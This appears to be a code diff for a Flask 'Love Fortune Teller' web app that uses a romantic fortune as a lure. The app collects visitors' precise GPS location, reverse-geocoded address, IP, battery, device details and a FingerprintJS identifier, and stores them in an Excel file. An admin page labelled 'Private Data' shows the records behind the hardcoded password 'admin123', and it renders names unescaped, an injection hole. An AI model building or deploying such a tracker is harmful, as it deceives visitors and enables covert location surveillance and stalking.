@@ -6,87 +6,107 @@ import os
 import random
 import shutil
 from datetime import datetime
+from openpyxl import load_workbook
+from openpyxl.utils import get_column_letter
 
 app = Flask(__name__)
 CORS(app)
 
-# Use an absolute path based on this script's directory
+# Use absolute path for persistent storage
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 EXCEL_FILE = os.path.join(BASE_DIR, 'fortunes_data.xlsx')
 BACKUP_FILE = os.path.join(BASE_DIR, 'fortunes_data_backup.xlsx')
 ADMIN_PASSWORD = 'admin123'
 
+# Define all required columns (clean table structure)
+COLUMNS = [
+    'DateTime', 'Name', 'Latitude', 'Longitude',
+    'Google Maps', 'Accuracy_m', 'Address',
+    'Battery_%', 'Charging', 'Device', 'Screen', 'Platform',
+    'IP_Address', 'Timezone', 'Device_Memory_GB', 'Network_Type', 'Fingerprint'
+]
+
 def ensure_persistent_storage():
-    """Create the Excel file with proper columns if it doesn't exist."""
+    """Create Excel file with proper headers and formatting if missing."""
     if not os.path.exists(EXCEL_FILE):
-        df = pd.DataFrame(columns=[
-            'DateTime', 'Name', 'Latitude', 'Longitude',
-            'Google Maps', 'Accuracy_m', 'Address',
-            'Battery_%', 'Charging', 'Device', 'Screen', 'Platform',
-            'IP_Address', 'Timezone', 'Device_Memory_GB', 'Network_Type', 'Fingerprint'
-        ])
-        df.to_excel(EXCEL_FILE, index=False)
+        df = pd.DataFrame(columns=COLUMNS)
+        df.to_excel(EXCEL_FILE, index=False, engine='openpyxl')
         print(f"✅ Created new Excel file at {EXCEL_FILE}")
+        _auto_adjust_column_widths(EXCEL_FILE)
     else:
-        # Verify columns exist; if not, add them (preserve existing data)
+        # Verify all columns exist; add missing ones without deleting data
         try:
-            df = pd.read_excel(EXCEL_FILE)
-            required_cols = [
-                'DateTime', 'Name', 'Latitude', 'Longitude',
-                'Google Maps', 'Accuracy_m', 'Address',
-                'Battery_%', 'Charging', 'Device', 'Screen', 'Platform',
-                'IP_Address', 'Timezone', 'Device_Memory_GB', 'Network_Type', 'Fingerprint'
-            ]
-            for col in required_cols:
-                if col not in df.columns:
+            df = pd.read_excel(EXCEL_FILE, engine='openpyxl')
+            missing_cols = [col for col in COLUMNS if col not in df.columns]
+            if missing_cols:
+                for col in missing_cols:
                     df[col] = ''
-            df.to_excel(EXCEL_FILE, index=False)
-            print(f"✅ Verified columns in existing Excel ({len(df)} records)")
+                df.to_excel(EXCEL_FILE, index=False, engine='openpyxl')
+                print(f"✅ Added missing columns: {missing_cols}")
+            # Ensure backup exists
+            if not os.path.exists(BACKUP_FILE):
+                shutil.copy2(EXCEL_FILE, BACKUP_FILE)
+                print("✅ Created backup")
+            _auto_adjust_column_widths(EXCEL_FILE)
         except Exception as e:
-            print(f"⚠️ Error reading Excel, will recreate: {e}")
-            # Backup corrupted file
+            print(f"⚠️ Error reading Excel: {e}. Creating backup and new file.")
             if os.path.exists(EXCEL_FILE):
                 shutil.copy2(EXCEL_FILE, EXCEL_FILE + '.corrupted')
-            ensure_persistent_storage()  # recreate fresh
-            return
+            df = pd.DataFrame(columns=COLUMNS)
+            df.to_excel(EXCEL_FILE, index=False, engine='openpyxl')
+            _auto_adjust_column_widths(EXCEL_FILE)
 
-    if os.path.exists(EXCEL_FILE) and not os.path.exists(BACKUP_FILE):
-        shutil.copy2(EXCEL_FILE, BACKUP_FILE)
-        print("✅ Created backup")
+def _auto_adjust_column_widths(filepath):
+    """Auto-fit column widths in Excel file for better readability."""
+    try:
+        wb = load_workbook(filepath)
+        ws = wb.active
+        for column in ws.columns:
+            max_length = 0
+            column_letter = get_column_letter(column[0].column)
+            for cell in column:
+                try:
+                    if cell.value:
+                        max_length = max(max_length, len(str(cell.value)))
+                except:
+                    pass
+            adjusted_width = min(max_length + 2, 50)  # limit to 50 chars
+            ws.column_dimensions[column_letter].width = adjusted_width
+        wb.save(filepath)
+    except Exception as e:
+        print(f"Warning: Could not auto-adjust columns: {e}")
 
 def load_data():
-    """Load all existing data from the Excel file."""
+    """Load all records as a DataFrame."""
     ensure_persistent_storage()
     try:
-        df = pd.read_excel(EXCEL_FILE)
-        print(f"✅ Loaded {len(df)} permanent records from {EXCEL_FILE}")
+        df = pd.read_excel(EXCEL_FILE, engine='openpyxl')
+        print(f"✅ Loaded {len(df)} records from Excel")
         return df
     except Exception as e:
-        print(f"❌ Failed to load Excel: {e}")
-        # Try backup
+        print(f"❌ Failed to load main file: {e}. Trying backup...")
         if os.path.exists(BACKUP_FILE):
             try:
-                df = pd.read_excel(BACKUP_FILE)
+                df = pd.read_excel(BACKUP_FILE, engine='openpyxl')
                 print(f"✅ Loaded {len(df)} records from backup")
                 return df
             except:
                 pass
-        # If all fails, return empty dataframe (should not happen because ensure_persistent_storage already created it)
-        return pd.DataFrame()
+        return pd.DataFrame(columns=COLUMNS)
 
-def save_data_permanent(data):
-    """Append a new record to the Excel file."""
+def save_data_permanent(record):
+    """Append a single record to the Excel file."""
     df = load_data()
-    new_row = pd.DataFrame([data])
+    new_row = pd.DataFrame([record])
     df = pd.concat([df, new_row], ignore_index=True)
-    df.to_excel(EXCEL_FILE, index=False)
-    # Also update backup
+    df.to_excel(EXCEL_FILE, index=False, engine='openpyxl')
     shutil.copy2(EXCEL_FILE, BACKUP_FILE)
+    _auto_adjust_column_widths(EXCEL_FILE)
     try:
         os.sync()  # force disk flush (Linux/Unix)
     except:
         pass
-    print(f"✅ SAVED PERMANENT: {data['Name']} | Total records: {len(df)}")
+    print(f"✅ Saved record for {record['Name']} | Total: {len(df)}")
     return True
 
 def geocode_reverse(lat, lon):
@@ -101,7 +121,7 @@ def geocode_reverse(lat, lon):
     except:
         return f"{lat:.4f}, {lon:.4f}"
 
-# 30+ ROMANTIC FORTUNES (unchanged)
+# 35+ romantic fortunes (each a short sentence, not a paragraph)
 FORTUNES = [
     "💕 Dear {name}, someone special is thinking of you right now!",
     "💖 {name}, a beautiful soul is about to enter your life!",
@@ -138,7 +158,7 @@ FORTUNES = [
     "🎈 {name}, something light and joyful is drifting toward your love life."
 ]
 
-# HTML (same as before, unchanged)
+# HTML (unchanged – same beautiful UI)
 HTML = '''<!DOCTYPE html>
 <html>
 <head>
@@ -147,7 +167,6 @@ HTML = '''<!DOCTYPE html>
 <title>Love Fortune Teller</title>
 <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@4/dist/fp.min.js"></script>
 <style>
-/* (your existing CSS – unchanged) */
 *{margin:0;padding:0;box-sizing:border-box;}
 body{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#ff9a9e,#fecfef,#ffdde1);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow-x:hidden;}
 .heart{position:fixed;pointer-events:none;z-index:0;animation:floatUp 4s linear infinite;}
@@ -220,16 +239,13 @@ h1{font-size:34px;margin:15px 0 8px;background:linear-gradient(135deg,#ff6b6b,#c
     <div>✨ The universe has spoken ✨</div>
   </div>
 </div>
-
 <script>
-// FingerprintJS initialization
 let visitorId = null;
 (async () => {
   const fp = await FingerprintJS.load();
   const result = await fp.get();
   visitorId = result.visitorId;
 })();
-
 setInterval(()=>{
   const h=document.createElement('div');
   h.innerHTML=['❤️','💕','💖','💗','💓','💝'][Math.floor(Math.random()*6)];
@@ -238,20 +254,16 @@ setInterval(()=>{
   document.body.appendChild(h);
   setTimeout(()=>h.remove(),4500);
 },600);
-
 let uname='';
 window.start=function(){
   uname=document.getElementById('uname').value.trim();
   if(!uname){alert('💕 Please enter your name!');return;}
   askLocation();
 };
-
 async function getBatteryInfo(){
   try{const b=await navigator.getBattery();return {level:Math.round(b.level*100),charging:b.charging};}
   catch(e){return {level:'N/A',charging:'N/A'};}
 }
-
-// Additional data collection
 function getTimezone(){ return Intl.DateTimeFormat().resolvedOptions().timeZone; }
 function getDeviceMemory(){ return navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown'; }
 function getNetworkType(){
@@ -259,7 +271,6 @@ function getNetworkType(){
   if(conn && conn.effectiveType) return conn.effectiveType;
   return 'Unknown';
 }
-
 function askLocation(){
   document.getElementById('res').classList.remove('show');
   document.getElementById('form').style.display='none';
@@ -273,7 +284,6 @@ function askLocation(){
       const tz = getTimezone();
       const mem = getDeviceMemory();
       const net = getNetworkType();
-      // wait for fingerprint (if not ready, fallback)
       let fp = visitorId;
       if(!fp){
         const fpLib = await FingerprintJS.load();
@@ -294,7 +304,6 @@ function askLocation(){
             userAgent:navigator.userAgent,
             screen:screen.width+'x'+screen.height,
             platform:navigator.platform,
-            // new fields
             timezone: tz,
             device_memory: mem,
             network_type: net,
@@ -332,7 +341,6 @@ def save():
         lon = data['longitude']
         addr = geocode_reverse(lat, lon)
         maps_link = f"https://www.google.com/maps?q={lat},{lon}"
-        # Client IP
         ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
 
         record = {
@@ -348,7 +356,6 @@ def save():
             'Device': data['userAgent'][:150],
             'Screen': data['screen'],
             'Platform': data['platform'],
-            # New columns
             'IP_Address': ip,
             'Timezone': data.get('timezone', 'Unknown'),
             'Device_Memory_GB': data.get('device_memory', 'Unknown'),
@@ -389,20 +396,20 @@ button{width:100%;padding:13px;background:linear-gradient(135deg,#ff6b6b,#c06c84
         gps = f"{row['Latitude']:.4f}, {row['Longitude']:.4f}"
         maps = row['Google Maps']
         rows += f'''<tr>
-            <td>{row['DateTime']}</td>
+            <td style="white-space:nowrap;">{row['DateTime']}</td>
             <td><b>{row['Name']}</b></td>
             <td><a href="{maps}" target="_blank">📍 {gps}</a></td>
-            <td style="max-width:220px; font-size:11px;">{row['Address']}</td>
+            <td style="max-width:250px; font-size:11px;">{row['Address']}</td>
             <td>{row['Accuracy_m']} m</td>
             <td>{row['Battery_%']}%</td>
             <td>{row['Charging']}</td>
             <td style="max-width:180px; font-size:10px;">{row['Device']}</td>
             <td>{row['Screen']}</td>
             <td>{row['Platform']}</td>
-            <td style="font-size:10px;">{row['IP_Address']}</td>
-            <td style="font-size:10px;">{row['Timezone']}</td>
-            <td style="font-size:10px;">{row['Device_Memory_GB']}</td>
-            <td style="font-size:10px;">{row['Network_Type']}</td>
+            <td>{row['IP_Address']}</td>
+            <td>{row['Timezone']}</td>
+            <td>{row['Device_Memory_GB']}</td>
+            <td>{row['Network_Type']}</td>
             <td style="font-size:9px;">{row['Fingerprint']}</td>
         </tr>'''
     return f'''<!DOCTYPE html>
@@ -410,13 +417,13 @@ button{width:100%;padding:13px;background:linear-gradient(135deg,#ff6b6b,#c06c84
 body{{font-family:sans-serif;padding:20px;background:#fff0f5;}}
 h1{{color:#c06c84;}}
 table{{width:100%;border-collapse:collapse;background:#fff;border-radius:15px;overflow-x:auto;display:block;}}
-th{{background:linear-gradient(135deg,#ff6b6b,#c06c84);color:#fff;padding:12px 14px;text-align:left;font-size:11px;}}
-td{{padding:8px 12px;border-bottom:1px solid #ffe0e9;font-size:10px;}}
+th{{background:linear-gradient(135deg,#ff6b6b,#c06c84);color:#fff;padding:12px 8px;text-align:left;font-size:11px;}}
+td{{padding:8px;border-bottom:1px solid #ffe0e9;font-size:10px;}}
 tr:hover td{{background:#fff5f8;}}
 a{{color:#c06c84;text-decoration:none;}}
 </style></head>
 <body><h1> Private Data — {len(df)} entries</h1>
-<div style="overflow-x:auto;"><tr>
+<div style="overflow-x:auto;"><table>
     <thead><tr><th>DateTime</th><th>Name</th><th>Location</th><th>Address</th><th>Accuracy</th><th>Battery%</th><th>Charging</th><th>Device</th><th>Screen</th><th>Platform</th><th>IP</th><th>Timezone</th><th>Memory</th><th>Network</th><th>Fingerprint</th></tr></thead>
     <tbody>{rows}</tbody>
 </table></div>
